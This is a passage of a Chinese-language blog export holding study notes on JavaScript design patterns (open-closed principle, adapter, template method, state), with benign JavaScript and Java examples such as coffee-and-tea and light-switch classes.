Duck )&#123; console.log( '嘎嘎嘎' ); &#125;else if ( animal instanceof Chicken )&#123; console.log( '咯咯咯' ); &#125;else if ( animal instanceof Dog )&#123; // 增加跟狗叫声相关的代码 console.log('汪汪汪' ); &#125; &#125;; var Dog = function()&#123;&#125;; makeSound( new Dog() ); // 增加一只狗// 改动后const makeSound = function(animal)&#123; animal.sound();&#125;const Duck = function()&#123;&#125;; Duck.prototype.sound = function()&#123; console.log( '嘎嘎嘎' ); &#125;; const Chicken = function()&#123;&#125;; Chicken.prototype.sound = function()&#123; console.log( '咯咯咯' ); &#125;; makeSound( new Duck() ); // 嘎嘎嘎makeSound( new Chicken() ); // 咯咯咯/********* 增加动物狗，不用改动原有的 makeSound 函数 ****************/ var Dog = function()&#123;&#125;; Dog.prototype.sound = function()&#123; console.log( '汪汪汪' ); &#125;; makeSound( new Dog() ); // 汪汪汪 找出变化的地方开放封闭原则是一个看起来比较虚幻的原则，并没有实际的模板教导我们怎样亦步亦趋地实现它。但我们还是能找到一些让程序尽量遵守开放-封闭原则的规律，最明显的就是找出程序中将要发生变化的地方，然后把变化封装起来 通过封装变化的方式，可以把系统中稳定不变的部分和容易变化的部分隔离开来。在系统的演变过程中，我们只需要替换那些容易变化的部分，如果这些部分是已经被封装好的，那么替换起来也相对容易。而变化部分之外的就是稳定的部分。在系统的演变过程中，稳定的部分是不需要改变的。 除了利用对象的多态性之外，还有其他方式可以帮助我们编写遵守开放-封闭原则的代码，下面将详细介绍。 1.放置倒钩 放置挂钩（hook）也是分离变化的一种方式。我们在程序有可能发生变化的地方放置一个挂钩，挂钩的返回结果决定了程序的下一步走向。这样一来，原本的代码执行路径上就出现了一个分叉路口，程序未来的执行方向被预埋下多种可能性。 由于子类的数量是无限制的，总会有一些“个性化”的子类迫使我们不得不去改变已经封装好的算法骨架。于是我们可以在父类中的某个容易变化的地方放置挂钩，挂钩的返回结果由具体子类决定。这样一来，程序就拥有了变化的可能 2.使用回调函数 回调函数是一种特殊的挂钩。我们可以把一部分易于变化的逻辑封装在回调函数里，然后把回调函数当作参数传入一个稳定和封闭的函数中。当回调函数被执行的时候，程序就可以因为回调函数的内部逻辑不同，而产生不同的结果。 设计模式中的开发-封闭原则有一种说法是，设计模式就是给做的好的设计取个名字。几乎所有的设计模式都是遵守开放-封闭原则的，我们见到的好设计，通常都经得起开放-封闭原则的考验。不管是具体的各种设计模式，还是更抽象的面向对象设计原则，比如单一职责原则、最少知识原则、依赖倒置原则等都是为了让程序遵守开放-封闭原则而出现的。可以这样说，开放-封闭原则是编写一个好程序的目标，其他设计原则都是达到这个目标的过程。 1.发布-订阅模式 模式用来降低多个对象之间的依赖关系，它可以取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。当有新的订阅者出现时，发布者的代码不需要进行任何修改；同样当发布者需要改变时，也不会影响到之前的订阅者。 2.模板方法模式 是一种典型的通过封装变化来提高系统扩展性的设计模式。在一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽出来放到父类的模板方法里面；而子类的方法具体怎么实现则是可变的，于是把这部分变化的逻辑封装到子类中。通过增加新的子类，便能给系统增加新的功能，并不需要改动抽象父类以及其他的子类，这也是符合开放-封闭原则的。 3.策略模式 策略模式和模板方法模式是一对竞争者。在大多数情况下，它们可以相互替换使用。模板方法模式基于继承的思想，而策略模式则偏重于组合和委托。 策略模式将各种算法都封装成单独的策略类，这些策略类可以被交换使用。策略和使用策略的客户代码可以分别独立进行修改而互不影响。我们增加一个新的策略类也非常方便，完全不用修改之前的代码 4.代理模式 5.职责链模式 接受第一次愚弄让程序一开始就尽量遵守开放-封闭原则，并不是一件很容易的事情。一方面，我们需要尽快知道程序在哪些地方会发生变化，这要求我们有一些“未卜先知”的能力。另一方面，留给程序员的需求排期并不是无限的，所以我们可以说服自己去接受不合理的代码带来的第一次愚弄。在最初编写代码的时候，先假设变化永远不会发生，这有利于我们迅速完成需求。当变化发生并且对我们接下来的工作造成影响的时候，可以再回过头来封装这些变化的地方。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——适配器模式]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——适配器模式适配器模式的作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。 适配器的别名是包装器，这是一个相对简单的模式。在程序开发中有许多这样的场景，当我们试图调用模块或者对象的某个接口的时候，却发现这个接口的格式并不符合目前的需求。这时候有两个解决方法，第一种是修改原来的接口，但是如果原来的模块很复杂，后者我们拿到的模块是别人编写压缩的代码，修改原来的接口就不太现实了。第二种方法是创建一个适配器，将原来的接口装换为客户希望的另一个接口，客户只需要和适配器打交道。 现实中的适配器适配器在现实生活的应用非常广泛，接下来我们来看几个现实生活中的适配器模式。 1.港式插头转换器港式的电器插头比大陆的电器插头体积要大一些。如果从香港买了一个 Mac book，我们会发现充电器无法插在家里的插座上，为此而改造家里的插座显然不方便，所以我们需要一个适配器。 2.电源适配器 Mac book 电池支持的电压是 20V，我们日常生活中的交流电压一般是 220V。除了我们了解的 220V 交流电压，日本和韩国的交流电压大多是 100V，而英国和澳大利亚的是 240V。笔记本电脑的电源适配器就承担了转换电压的作用，电源适配器使笔记本电脑在 100V~240V 的电压之内都能正常工作，这也是它为什么被称为电源“适配器”的原因。 3.USB 转接口 在以前的电脑上，PS2 接口是连接鼠标、键盘等其他外部设备的标准接口。但随着技术的发展，越来越多的电脑开始放弃了 PS2 接口，转而仅支持 USB 接口。所以那些过去生产出来的只拥有 PS2 接口的鼠标、键盘、游戏手柄等，需要一个 USB 转接口才能继续正常工作，这是 PS2-USB适配器诞生的原因 适配器模式应用在 JSON 格式流行之前，很多 cgi 返回的都是 XML 格式的数据，如果今天仍然想继续使用这些接口，显然我们可以创造一个XML-JSON 的适配器。 当我们向 googleMap 和 baiduMap 都发出“显示”请求时，googleMap和 baiduMap 分别以各自的方式在页面中展现了地图： 12345678910111213const googleMap = &#123; show:function()&#123;&#125;&#125;const baiduMap = &#123; show:function()&#123;&#125;&#125;const renderMap = function(map)&#123; if(map.show instanceof Function)&#123; map.show(); &#125;&#125;renderMap(googleMap);renderMap(baiduMap); 这段程序得以顺利运行的关键是 googleMap 和 baiduMap 提供了一致的 show 方法，但第三方的接口方法并不在我们自己的控制范围之内，假如 baiduMap 提供的显示地图的方法不叫 show 而叫display 呢？ baiduMap 这个对象来源于第三方，正常情况下我们都不应该去改动它。此时我们可以通过增加 baiduMapAdapter 来解决问题： 123456789101112131415161718const googleMap = &#123; show:function()&#123;&#125;&#125;const baiduMap = &#123; display::function()&#123;&#125;&#125;const baiduMapAdapter = &#123; show:function()&#123; return baiduMap.display(); &#125;&#125;const renderMap = function(map)&#123; if(map.show instanceof Function)&#123; map.show(); &#125;&#125;renderMap(googleMap);renderMap(baiduMapAdapter); 再来看看另外一个例子。假设我们正在编写一个渲染广东省地图的页面。目前从第三方资源里获得了广东省的所有城市以及它们所对应的 ID，并且成功地渲染到页面中： 123456789101112131415const getGuangdongCity = function()&#123; const guangdongCity = [&#123; name:'shenzhen', id:11, &#125;,&#123; name:'guangzhou', id:12, &#125;]; return guangdongCity;&#125;const render = function(fn)&#123; console.log(''); document.write(JSON.stringfy(fn()));&#125;render(getGuangdongCity); 利用这些数据，我们编写完成了整个页面，并且在线上稳定地运行了一段时间。但后来发现这些数据不太可靠，里面还缺少很多城市。于是我们又在网上找到了另外一些数据资源，这次的数据更加全面，但遗憾的是，数据结构和正运行在项目中的并不一致。新的数据结构如下: 12345const guangdongCity = &#123; shenzhen:11, guangzhou:12, zhuhai:13&#125; 除了大动干戈地改写渲染页面的前端代码之外，另外一种更轻便的解决方式就是新增一个数据格式转换的适配器: 1234567891011const addressAdapter = function(oldAddressfn)&#123; const address = &#123;&#125;, oldAddressfn = oldAddressfn(); for(var i=0,c;c = oldAddress[i++];)&#123; address[c.name] = c.id &#125; return function()&#123; address; &#125;&#125;render(addressAdapter(getGuangdongCity)); 那么接下来需要做的，就是把代码中调用 getGuangdongCity 的地方，用经过 addressAdapter适配器转换之后的新函数来代替。 小结适配器模式是一种相对比较简单的模式。装饰者模式、代理模式和外观模式其实都挺相似的，都是由一个对象来包装另一个对象。区别它们的关键仍然是模式的意图。 适配器模式主要用来解决两个已有的接口之间不匹配的问题，它不考虑这些接口是怎么样实现的，也不考虑它们将来可能会如何演变，适配器模式不需要改变已有的接口，就能够使它们协同作用。 装饰者模式和代理模式也不会改变原来对象的接口，但装饰者模式的作用是为了给对象增加功能。装饰者模式常常形成一条很长的装饰链，而是适配器模式通常只包装一次。代理模式是为了控制对对象的访问，通常也只包装一次。 外观模式的作用倒是和适配器模式比较相似的，有人把外观模式看成一组对象的适配器，但外观模式最显著的特点是定义了一个新的接口。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——模板方法模式]]></title>
    <url>%2F2019-03-21-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——模板方法模式在 JavaScript 开发中用到继承的场景其实不是很多，很多时候我们都喜欢用 mix-in 的方式给对象扩展属性。但这部代表继承在 JavaScript 中没有用武之地，虽然没有真正的类和继承机制，但是我们可以通过原型 prototype 来变相地继承。 本章讨论一种基于继承的设计模式——模板方法（Template Method）模式 定义和组成模板方法模式只是一种需要使用继承就可以实现的非常简单的模式。 模板方法模式由两个部分结构组成，第一部分是抽象父类，第二部分是具体的实现子类。通常在抽象父类中封装了子类的算法框架，包括实现一些公共的方法以及封装子类中所有方法的执行顺序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。 假如我们有一些平行的子类，各个子类之间有一些相同的行为，也有一些不同的行为。如果相同和不同的行为都混合在各个子类的实现中，说明这些相同的行为会在各个子类中重复出现。但实际上，相同的行为可以被搬移到另外一个单一的地方，模板方法模式就是为了解决这个问题而生的。在模板方法模式中，子类实现的相同部分被上移到了父类中，而将不同的部分留待子类类实现。也很好地体现了泛化的思想。 Coffee or Tea咖啡和茶是一个经典的例子。 先泡一杯咖啡首先，我们来泡一杯咖啡，如果没有什么太多个性化的需求，一般的步骤如下： 把水煮沸 用沸水冲泡咖啡 把咖啡倒进杯子 加糖和牛奶 代码： 123456789101112131415161718192021var Coffee = function()&#123;&#125;Coffee.prototype.boilWater = function()&#123; console.log('把水煮沸');&#125; Coffee.prototype.brewCoffeeGriends = function()&#123; console.log('用沸水冲泡咖啡');&#125; Coffee.prototype.pourInCup = function()&#123; console.log('把咖啡倒进杯子');&#125; Coffee.prototype.addSugarAndMilk = function()&#123; console.log('加糖和牛奶');&#125;Coffee.prototype.init = function()&#123; this.boilWater() this.brewCoffeeGriends() this.pourInCup() this.addSugarAndMilk()&#125;var coffee = new Coffee();coffee.init(); 泡一壶茶开始准备我们的茶，步骤差不多： 把水煮沸 用沸水浸泡茶叶 把茶水倒进杯子 加柠檬 代码实现： 123456789101112131415161718192021var Tea = function()&#123;&#125;Tea.prototype.boilWater = function()&#123; console.log('把水煮沸');&#125; Tea.prototype.steepTeaBag = function()&#123; console.log('用沸水浸泡茶叶');&#125; Tea.prototype.pourInCup = function()&#123; console.log('把茶水倒进杯子');&#125; Tea.prototype.addLemon = function()&#123; console.log('加柠檬');&#125;Tea.prototype.init = function()&#123; this.boilWater() this.steepTeaBag() this.pourInCup() this.addLemon()&#125; var tea = new Tea();tea.init(); 分离出共同点我们可以发现其实两个步骤是大同小异的。 主要体现为： 原料不同。一个是咖啡，一个是茶，但我们都可以统称之为饮料 泡的方式不同。咖啡是冲泡，而茶叶是浸泡，但是都可以抽象为“泡” 加入的调料不同。一个是糖和牛奶，一个是柠檬，但是都可以抽象为 “调料” 不管是茶还是咖啡都可以整理为下面四步： 把水煮沸 用沸水浸泡饮料 把饮料倒进杯子 加调料(condiments) 现在可以创建一个抽象父类来表示泡(brew)一杯饮料(Beverage)的整个过程： 1234567891011121314var Beverage = function()&#123;&#125;Beverage.prototype.boilWater = function()&#123; console.log('把水煮沸');&#125; // 空方法，应该由子类重写Beverage.prototype.brew = function()&#123;&#125; Beverage.prototype.pourInCup = function()&#123;&#125; Beverage.prototype.addCondiments = function()&#123;&#125;Beverage.prototype.init = function()&#123; this.boilWater() this.brew() this.pourInCup() this.addCondiments()&#125; 创建 Coffee 子类和 Tea 子类继承饮料类： 1234567891011121314var Coffee = function()&#123;&#125;Coffee.prototype = new Beverage();// 重写抽象父类中的一些方法，把只有把水煮沸这个行为可以使用父类中的 boilWater 方法，其他都需要在 Coffee 子类中重写Coffee.prototype.brew = function()&#123; console.log('用沸水冲泡咖啡');&#125; Coffee.prototype.pourInCup = function()&#123; console.log('把咖啡倒进杯子');&#125; Coffee.prototype.addCondiments = function()&#123; console.log('加糖和牛奶');&#125;var coffee = new Coffee();coffee.init(); 当调用 coffee 对象的 init 方法时候，由于 coffee 对象和 Coffee 构造器的原型 prototype 上没有这个方法，所以该请求会顺着原型链，被委托给 Coffee 的父类 Beverage 原型上的 init 方法。而这个方法已经规定好了泡饮料的顺序，所以我们成功地泡出了一杯咖啡。 Tea 类： 12345678910111213var Tea = function()&#123;&#125;Tea.prototype = new Beverage();Tea.prototype.brew = function()&#123; console.log('用沸水浸泡茶叶');&#125; Tea.prototype.pourInCup = function()&#123; console.log('把茶水倒进杯子');&#125; Tea.prototype.addCondiments = function()&#123; console.log('加柠檬');&#125;var tea = new Tea();tea.init(); Beverage.prototype.init 就是模板方法，该方法中封装了子类的算法框架，他作为一个算法的模板，指导子类以何种顺序去执行哪些方法。在这个方法中，算法内的每一步骤都清楚地展示在我们面前。 抽象类在 Java 中，类分成两种，一种是具体类，另一种就是抽象类。具体类可以被实例化，抽象类不能被实例化。 由于抽象类不能被实例化，如果有人编写了一个抽象类，那么这个抽象类一定是用来被某些具体类继承的。 抽象类和接口一样可以用于向上转型，在静态类型语言中，编译器对类型检查总是一个绕不开的话题与困扰。虽然类型检查可以提供程序的安全性，但繁琐而严格的类型检查也时常会让程序员觉得麻烦。把对象的真正类型隐藏在抽象类或者接口之后，这些对象才可以被互相替换使用。这可以让我们 Java 程序尽量避免依赖倒置原则。 除了用于向上转型，抽象类也可以表示一种契约。继承了这个抽象类的所有子类都将拥有跟抽象类一致的接口方法，抽象类的主要作用就是为它的子类定义这些公共接口。如果我们在子类中删除了这些方法中的某一个，那么将不能通过编译器的检查，这在某些场景下是非常有用的。例如，Coffee 子类中没有实现对应的 brew 方法，那么我们百分之百得不到一杯咖啡。既然父类规定了子类的方法和执行这些方法的顺序，子类就应该拥有这些方法，并且提供正确的实现。 抽象方法和具体方法抽象方法被声明在抽象类中，抽象方法并没有具体的实现过程，都是一些 “哑” 方法。比如 Beverage 类中的 brew 方法、pourInCup 方法和 addCondiments 方法，都被声明为抽象方法。当子类继承了这个抽象类时，必须重写父类的抽象方法。 除了抽象方法之外，如果每个子类中都有一些同样的具体实现方法，那这些方法也可以选择放在抽象类中，这可以节省代码以达到复用的效果，这些方法叫做具体方法。当代码需要改变的时候，我们需要改动抽象类里的具体方法就可以了。 用 Java 实现 Coffee or Tea123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public abstract class Beverage&#123; // 抽象类饮料 final void init()&#123; // 模板方法 boilWater(); brew(); pourInCup(); addCondiments(); &#125; // 具体方法 void boilWater()&#123; System.out.println('把水煮沸'); &#125; // 抽象类方法 abstract void brew(); abstract void pourInCup(); abstract void addCondiments();&#125;public class Coffee extends Beverage&#123; // Coffee 类 @Override void brew()&#123; // 子类中重写 brew 方法 System.out.println('用沸水冲泡咖啡'); &#125; @Override void pourInCup()&#123; // 子类中重写 pourInCup 方法 System.out.println('把咖啡倒进杯子'); &#125; @Override void addCondiments()&#123; // 子类中重写 addCondiments 方法 System.out.println('加糖和牛奶'); &#125; &#125;public class Tea extends Beverage&#123; // Coffee 类 @Override void brew()&#123; // 子类中重写 brew 方法 System.out.println('用沸水浸泡茶叶'); &#125; @Override void pourInCup()&#123; // 子类中重写 pourInCup 方法 System.out.println('把茶倒进杯子'); &#125; @Override void addCondiments()&#123; // 子类中重写 addCondiments 方法 System.out.println('加柠檬'); &#125; &#125;public class Test&#123; public static void prepareRecipe(Beverage beverage)&#123; beverage.init(); &#125; public static void main(String args[])&#123; Beverage coffee = new Coffee(); // 创建 coffee 对象 prepareRecipe(coffee); // 开始泡咖啡 // 把水煮沸 // 用沸水冲泡咖啡 // 把咖啡倒进杯子 // 加糖和牛奶 Beverage tea = new Tea(); // 创建 tea 对象 prepareRecipe(tea); // 开始泡茶 // 把水煮沸 // 用沸水浸泡茶叶 // 把茶倒进杯子 // 加柠檬 &#125;&#125; JavaScript 没有抽象类的缺点和解决方案JavaScript 并没有从语法层面提供对抽象类的支持。抽象类的第一个作用是隐藏对象的具体类型，由于 JavaScript 是一门 “类型模糊” 的语言，所以隐藏对象的类型在 JavaScript 中并不重要。 另一方面，当我们在 JavaScript 中使用原型继承模拟传统的类式继承时，并没有编译器帮助我们进行任何形式的检查，我们也没有办法保证子类会重写父类中的 “抽象方法”。 我们知道，Beverage.prototype.init 作为模仿方法，已经规定了子类的算法框架，代码如下： 123456Beverage.prototype.init = function()&#123; this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments(); &#125;; 如果我们的 Coffee 类或者 Tea 类忘记实现这 4 个方法中的一个呢？拿 brew 方法举例，如果我们忘记编写 Coffee.prototype.brew 方法，那么当请求 coffee 对象的 brew 时，请求会顺着原型链找到 Beverage“父类”对应的 Beverage.prototype.brew 方法，而 Beverage.prototype.brew 方到目前为止是一个空方法，这显然是不能符合我们需要的。 在 Java 中编译器会保证子类会重写父类中的抽象方法，但在 JavaScript 中却没有进行这些检查工作。我们在编写代码的时候得不到任何形式的警告，完全寄托于程序员的记忆力和自觉性是很危险的，特别是当我们使用模板方法模式这种完全依赖继承而实现的设计模式时。 下面提供两种变通的解决方案。 第 1 种方案是用鸭子类型来模拟接口检查，以便确保子类中确实重写了父类的方法。但模拟接口检查会带来不必要的复杂性，而且要求程序员主动进行这些接口检查，这就要求我们在业务代码中添加一些跟业务逻辑无关的代码。 第 2 种方案是让 Beverage.prototype.brew 等方法直接抛出一个异常，如果因为粗心忘记编写 Coffee.prototype.brew 方法，那么至少我们会在程序运行时得到一个错误。 123456789Beverage.prototype.brew = function()&#123; throw new Error( '子类必须重写 brew 方法' ); &#125;; Beverage.prototype.pourInCup = function()&#123; throw new Error( '子类必须重写 pourInCup 方法' ); &#125;; Beverage.prototype.addCondiments = function()&#123; throw new Error( '子类必须重写 addCondiments 方法' ); &#125;; 第 2 种解决方案的优点是实现简单，付出的额外代价很少；缺点是我们得到错误信息的时间点太靠后 我们一共有 3 次机会得到这个错误信息，第 1 次是在编写代码的时候，通过编译器的检查来得到错误信息；第 2 次是在创建对象的时候用鸭子类型来进行“接口检查”；而目前我们不得不利用最后一次机会，在程序运行过程中才知道哪里发生了错误。 使用场景从大的方面来讲，模板方法模式常被架构师用于构建项目的框架，架构师订好了框架的骨架，程序员继承架构的结构后，负责往里面填空，比如 Java 程序员大多使用过的 HttpServlet 技术来开发项目。 一个基于 HttpServlet 的程序包含 7 个 生命周期，这 7 个周期分别对应一个 do 方法。 doGet() doHead() doPut() doDelete() doOption() doTrace() HttpServlet 类还提供了一个 service 方法，它就是这里的模板方法，service 规定了这些 do 方法的执行顺序，而这些 do 方法的具体实现则需要 HttpServlet 的子类来提供。 在 Web 开发中也能找打很多模板方法模式适用的场景，比如我们在构建一系列的 UI 组件，这些组件的构建过程一般如下所示： 初始化一个 div 容器 通过 ajax 请求拉取相应的数据 把数据渲染到 div 容器里面，完成组件的构造 通知用户组件渲染完毕 我们可以看到，任何组件的构建都遵循上面的四部，其中第一步和最后一步是相同的，第二步不同的地方是请求 ajax 的远程地址，第三步不同地方是渲染数据的方式。 钩子方法通过模板方法模式，我们在父类中封装了子类的算法框架。这些算法框架在正常状态下是适用于多数子类的，但如果有一些特别“个性”的子类呢？比如我们在 饮料类 Beverage 中封装了饮料冲泡顺序： 把水煮沸 用沸水冲泡饮料 把饮料倒入杯中 加调料 在我们的饮料店中，根据这四个步骤制作出来的咖啡和茶，一直顺利地提供给绝大多数客人享用。但有一些客人喝咖啡是不加调料的。既然 Beverage 作为父类，已经规定好了冲泡饮料的四个步骤，那么有什么方法可以让子类不受这个约束？ 钩子方法（hook） 可以用来解决这个问题，放置钩子是隔离变化的一种常见的手段，我们在父类中容易变化的地方放置钩子，钩子可以有一个默认的实现，究竟要不要 “挂钩”，这由子类自行决定。钩子方法的返回结果决定了模板方法后面部分的执行步骤，也就是程序接下来的走向，这样一来，程序就拥有了变化的可能。 在这个例子里面，我们把挂钩的名为定位 customWantsCondiments，接下来将挂钩放入 Beverage 类，看看我们如何得到一杯不需要 糖和牛奶的咖啡，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142var Beverage = function()&#123;&#125;Beverage.prototype.boilWater = function()&#123; console.log('把水煮沸');&#125; Beverage.prototype.brew = function()&#123; throw new Error('子类必须重写 brew 方法');&#125; Beverage.prototype.pourInCup = function()&#123; throw new Error('子类必须重写 pourInCup 方法');&#125; Beverage.prototype.addCondiments = function()&#123; throw new Error('子类必须重写 addCondiments 方法');&#125;Beverage.prototype.customerWantsCondiments = function()&#123; return false; // 默认需要调料&#125; Beverage.prototype.init = function()&#123; this.boilWater() this.brew() this.pourInCup() if(this.customerWantsCondiments())&#123; this.addCondiments() &#125; &#125; var CoffeeWithHook = function()&#123;&#125;CoffeeWithHook.prototype = new Beverage();CoffeeWithHook.prototype.brew = function()&#123; console.log('用沸水冲泡咖啡');&#125;CoffeeWithHook.prototype.pourInCup = function()&#123; console.log('把咖啡倒进杯子');&#125;CoffeeWithHook.prototype.addCondiments = function()&#123; console.log('加糖和牛奶');&#125;CoffeeWithHook.prototype.customerWantsCondiments = function()&#123; return window.confirm('请问需要调料吗？');&#125; var coffeeWithHook = new CoffeeWithHook();coffeeWithHook.init(); 好莱坞原则好莱坞无疑是演员的天堂，但好莱坞也有很多找不到工作的新人演员，许多新人演员在好莱坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不耐烦了，给演艺公司打电话询问情况，演艺公司往往这样回答：“不要来找我，我会给你打电话。” 在设计中，这样的规则就是好莱坞原则。在这一原则的指导下，我们运行底层组件将自己挂钩到高层组件中，而高层组件决定什么时候、以何种方式去使用这些底层组件，高层组件对待底层组件的方式，跟演艺公司对待新人演员一样，都是 “别调用我们，我们会调用你”。 模板方法模式是好莱坞原则的一个典型使用场景，它与好莱坞原则的联系非常明显，当我们用模板方法模式编写一个程序的时候，这意味着子类放弃了对自己的控制权，而是改成父类通知子类，哪些方法应该在什么时候被调用，作为子类，只负责提供一些设计上的细节。 除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布-订阅模式和回调函数。 发布-订阅模式 发布者会把消息推送给订阅者，这取代了原先不断去 fetch 消息的形式。例如假设我们乘坐出租车去一个不了解的地方，除了每过 5 秒钟问司机 “是否达到了目的地”之外，还可以在车上美美地睡一觉，然后跟司机说好，等目的地到了就叫醒你。这也相当于好莱坞原则中的 “别调用我们，我们会调用你” 回调函数 在 ajax 异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这项显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传入发起 ajax 异步请求的函数。当数据返回之后，这个回调函数才被执行，这也是好莱坞原则的一种体现。把需要执行的操作封装在回调函数里面，然后把主动权交给另一个函数。至于回调函数什么时候被调用，则是另外一个函数控制的。 真的需要 “继承” 吗模板方法模式是基于继承的一种设计模式，父类封装了子类的算法框架和方法的执行顺序，子类继承父类之后，父类通知子类执行这些方法，好莱坞原则很好地诠释了这种设计技巧，即高层组件调用底层组件。 上面的例子中，我们编写了一个 Coffee or Tea 的例子。模板方法模式是为数不多的基于继承的设计模式，但 JavaScript 语言实际上没有提供真正的类式继承模式，继承是通过对象与对象之间的委托来实现的。也就是说，虽然我们在形式上借鉴了提供类式继承的语言，但本章学习到的模板方法模式并不十分正宗。 在好莱坞原则的指导下，下面的这段代码可以达到和继承一样的效果。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152var Beverage = function(param)&#123; var boilWater = function()&#123; console.log('把水煮沸'); &#125;; var brew = param.brew || function()&#123; throw new Error('必须传递 brew 方法'); &#125;; var pourInCup = param.pourInCup || function()&#123; throw new Error('必须传递 pourInCup 方法'); &#125;; var addCondiments = param.addCondiments || function()&#123; throw new Error('必须传递 addCondiments 方法'); &#125;; var F = function()&#123;&#125;; F.prototype.init = function()&#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; return F;&#125;var Coffee = Beverage(&#123; brew:function()&#123; console.log('用沸水冲泡咖啡'); &#125;, pourInCup:function()&#123; console.log('把咖啡倒进杯子'); &#125;, addCondiments:function()&#123; console.log('加糖和牛奶'); &#125; &#125;);var Tea = Beverage(&#123; brew: function()&#123; console.log( '用沸水浸泡茶叶' ); &#125;, pourInCup: function()&#123; console.log( '把茶倒进杯子' ); &#125;, addCondiments: function()&#123; console.log( '加柠檬' ); &#125; &#125;); var coffee = new Coffee();coffee.init();var tea = new Tea();tea.init(); 在这段代码中，我们把 brew、pourInCup、addCondiments 这些方法依次传入 Beverage 函数，Beverage 函数被调用之后返回构造器 F。F 类中包含了“模板方法”F.prototype.init。跟继承得到的效果一样，该“模板方法”里依然封装了饮料子类的算法框架 小结模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语言中，一个运用模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这部分变化的逻辑封装到子类中。通过增加新的子类，我们便能对系统增加新的功能，并不需要改动抽象已经其他子类，这也是符合开发-封闭的原则。 但在 JavaScript 中，我们很多时候并不需要这样去实现一个模板方法模式，高阶函数是更好的选择。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——状态模式]]></title>
    <url>%2F2019-03-15-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——状态模式态模式是一种非同寻常的优秀模式，它也许是解决某些需求场景的最好方法。虽然状态模式并不是一种简单到一目了然的模式（它往往还会带来代码量的增加），但你一旦明白了状态模式的精髓，以后一定会感谢它带给你的无与伦比的好处。 状态模式的关键是区分事物内部的状态，事物内部状态的改变往往会带来事物的行为改变。 初识场景：有一个电灯，电灯上面只有一个开关。当电灯开着的时候，此时按下开关，电灯会切换到关闭状态；再按一次开关，电灯又将被打开。同一个开关按钮，在不同的状态下，表现出来的行为是不一样的。 首先定义一个 Light 类，可以预见，电灯对象 light 将从 Light类创建而出， light 对象将拥有两个属性，我们用 state 来记录电灯当前的状态，用 button 表示具体的开关按钮。下面来编写这个电灯程序的例子。 例子：电灯程序1234567891011121314151617181920212223242526const Light = function()&#123; this.state = 'off'; // 给电灯设置初始状态 off this.button = null; // 电灯开关按钮&#125;// 该方法负责在页面中创建一个真实的 button 节点，这个 button 就是电灯的开关按钮Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; button.innerHTML = '开关'; this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.buttonWasPressed(); &#125;&#125;Light.prototype.buttonWasPressed = function()&#123; if(this.state === 'off')&#123; console.log('开灯'); this.state = 'on'; &#125;else if(this.state === 'on')&#123; console.log('关灯'); this.state = 'off'; &#125;&#125;const light = new Light();light.init(); 新型电灯： 123456789101112Light.prototype.buttonWasPressed = function()&#123; if ( this.state === 'off' )&#123; console.log( '弱光' ); this.state = 'weakLight'; &#125;else if ( this.state === 'weakLight' )&#123; console.log( '强光' ); this.state = 'strongLight'; &#125;else if ( this.state === 'strongLight' )&#123; console.log( '关灯' ); this.state = 'off'; &#125; &#125;; 很明显 buttonWasPressed 方法是违反开放封闭原则的，每次新增或者修改 light 的状态，都需要改动 buttonWasPressed 方法中的代码，这使得 buttonWasPressed 成为了一个非常不稳定的方法。 